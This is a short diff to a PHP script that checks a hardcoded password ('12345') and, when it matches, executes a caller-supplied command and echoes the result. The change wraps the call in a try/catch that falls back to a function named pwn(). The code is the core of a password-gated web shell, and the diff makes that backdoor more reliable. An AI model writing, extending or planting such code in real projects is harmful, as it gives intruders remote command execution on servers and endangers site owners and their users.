@@ -1,4 +1,3 @@
-
 <?php
 
 $password = "12345";
@@ -240,7 +239,15 @@ if($password === $get_password)
 { 
   if(isset($cmd))
   {
-	echo trim(exe($cmd));
+	
+	try 
+	{
+		echo trim(exe($cmd));
+	}
+	catch (Exception $e) 
+	{
+		echo trim(pwn($cmd));
+	}
   }
   else
   {
